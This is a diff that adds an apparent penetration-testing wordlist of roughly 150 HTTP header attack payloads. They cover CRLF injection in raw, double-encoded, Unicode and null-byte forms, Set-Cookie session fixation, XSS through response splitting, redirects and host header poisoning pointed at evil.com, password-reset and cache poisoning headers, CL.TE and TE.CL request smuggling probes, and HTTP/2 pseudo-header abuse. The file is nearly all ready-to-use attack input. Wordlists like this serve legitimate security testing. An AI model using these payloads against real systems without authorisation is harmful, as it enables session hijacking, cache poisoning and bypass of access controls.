@@ -1,0 +1,218 @@
+# ============================================================================
+# WhiteHatHacker AI — Header Injection / CRLF Payload Wordlist
+# Categories: CRLF Injection, Host Header, HTTP Response Splitting,
+#             Cache Poisoning Headers, Request Smuggling Probes
+# Total: ~150 payloads
+# ============================================================================
+
+# --- BASIC CRLF INJECTION ---
+%0d%0aInjected-Header:true
+%0d%0aSet-Cookie:injected=true
+%0d%0aLocation:https://evil.com
+%0d%0a%0d%0a<script>alert(1)</script>
+%0aInjected-Header:true
+%0dInjected-Header:true
+%0d%0aX-Injected:true
+\r\nInjected-Header:true
+\r\n\r\n<script>alert(1)</script>
+\nInjected-Header:true
+\rInjected-Header:true
+
+# --- DOUBLE ENCODING CRLF ---
+%250d%250aInjected-Header:true
+%250d%250aSet-Cookie:injected=true
+%250d%250a%250d%250a<script>alert(1)</script>
+%25250d%25250aInjected-Header:true
+
+# --- UNICODE CRLF ---
+%E5%98%8A%E5%98%8DInjected-Header:true
+%E5%98%8A%E5%98%8DSet-Cookie:injected=true
+%E5%98%8A%E5%98%8DLocation:https://evil.com
+%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<script>alert(1)</script>
+%c4%8d%c4%8aInjected-Header:true
+
+# --- NULL BYTE + CRLF ---
+%00%0d%0aInjected-Header:true
+%00%0d%0aSet-Cookie:injected=true
+
+# --- CRLF + SET-COOKIE ---
+%0d%0aSet-Cookie:session=evil
+%0d%0aSet-Cookie:admin=true
+%0d%0aSet-Cookie:session=evil;%20Path=/;%20HttpOnly
+%0d%0aSet-Cookie:PHPSESSID=evil
+%0d%0aSet-Cookie:token=evil;%20Domain=.target.com
+
+# --- CRLF + XSS ---
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0a%0d%0a<img src=x onerror=alert(1)>
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+# --- CRLF + REDIRECT ---
+%0d%0aLocation:%20https://evil.com
+%0d%0aLocation:%20//evil.com
+%0d%0aLocation:https://evil.com%0d%0aContent-Length:0%0d%0a
+
+# --- HOST HEADER INJECTION ---
+evil.com
+target.com@evil.com
+target.com%00.evil.com
+target.com%0d%0aX-Injected:true
+evil.com\r\nX-Injected: true
+target.com:@evil.com
+target.com#@evil.com
+
+# --- HOST HEADER (X-Forwarded-Host) ---
+# X-Forwarded-Host: evil.com
+# X-Forwarded-For: 127.0.0.1
+# X-Host: evil.com
+# X-Original-Host: evil.com
+# X-Forwarded-Server: evil.com
+# Host: evil.com
+# X-HTTP-Host-Override: evil.com
+# Forwarded: host=evil.com
+
+# --- HOST HEADER (Password Reset Poisoning) ---
+# Host: evil.com  (on password reset endpoint)
+# X-Forwarded-Host: evil.com (on password reset endpoint)
+
+# --- HOST HEADER (Web Cache Poisoning) ---
+# Host: target.com
+# X-Forwarded-Host: evil.com
+
+# --- HTTP RESPONSE SPLITTING ---
+%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>
+%0d%0a%0d%0aHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>
+
+# --- HTTP REQUEST SMUGGLING PROBES ---
+# CL.TE detection
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX
+# TE.CL detection
+POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n
+# Header smuggling
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding:chunked
+Transfer-Encoding	:	chunked
+Transfer-Encoding:	chunked
+Transfer-Encoding:  chunked
+Transfer-Encoding\r\n: chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+X:X[\n]Transfer-Encoding: chunked
+
+# --- CONNECTION HEADER ABUSE ---
+Connection: keep-alive, Transfer-Encoding
+Connection: close, Transfer-Encoding
+
+# --- CONTINUATION HEADER ---
+ Injected-Header: true
+	Injected-Header: true
+
+# --- CACHE POISONING HEADERS ---
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: nothttps
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-Port: 443
+X-Forwarded-Prefix: /evil
+
+# --- ENCODING VARIANTS ---
+%0D%0AInjected-Header:true
+%0d%0AInjected-Header:true
+%0D%0aInjected-Header:true
+%%0d0aInjected-Header:true
+%%0a0dInjected-Header:true
+%c0%8d%c0%8aInjected-Header:true
+
+# ============================================================================
+# EXPANSION: Advanced Header Injection ??? HTTP/2, Cache Poison, CRLF
+# ============================================================================
+
+# --- CRLF Injection Variants ---
+%0d%0aInjected-Header:true
+%0d%0aSet-Cookie:hacked=1
+%0d%0aX-Injected:true
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Length:35%0d%0a%0d%0a<html>hijacked</html>
+%0d%0aLocation:http://evil.com
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+\r\nInjected:true
+\r\nSet-Cookie:hacked=1
+%0aInjected:true
+%0dInjected:true
+%E5%98%8A%E5%98%8DInjected:true
+%c0%8d%c0%8aInjected:true
+\n\rInjected:true
+
+# --- Host Header Attacks ---
+evil.com
+good.com@evil.com
+evil.com%00good.com
+evil.com%20good.com
+good.com:@evil.com
+evil.com#good.com
+evil.com?good.com
+good.com\tevil.com
+evil.com, good.com
+good.com
+X-Forwarded-Host: evil.com
+localhost
+127.0.0.1
+[::1]
+evil.com:443
+
+# --- X-Forwarded-For Spoofing ---
+127.0.0.1
+127.0.0.1, 10.0.0.1
+::1
+0.0.0.0
+localhost
+192.168.1.1
+10.0.0.1
+172.16.0.1
+
+# --- Cache Poisoning Headers ---
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: nothttps
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-Port: 443
+X-Forwarded-Proto: https
+X-Host: evil.com
+X-Original-Host: evil.com
+Forwarded: for=evil.com
+
+# --- HTTP/2 Pseudo-Header Abuse ---
+:authority: evil.com
+:method: CONNECT
+:path: /admin
+:scheme: http
+:path: /../admin
+
+# --- Transfer-Encoding / Content-Length Smuggling ---
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: identity, chunked
+Transfer-Encoding:chunked
+Content-Length: 0\r\nTransfer-Encoding: chunked
+
+# --- Request Line Injection ---
+GET /admin HTTP/1.1\r\nHost: good.com\r\n\r\nGET /evil
+GET @evil.com/ HTTP/1.1
+GET //evil.com/ HTTP/1.1
+GET http://evil.com/ HTTP/1.1
+
+# --- Connection Header Tricks ---
+Connection: keep-alive, Transfer-Encoding
+Connection: close, X-Forwarded-For
+Upgrade: websocket
+
+# --- Content-Type Abuse ---
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
+Content-Type: multipart/form-data; boundary=----evil
+Content-Type: application/xml
+Content-Type: text/xml
+Content-Type: application/json; charset=utf-7
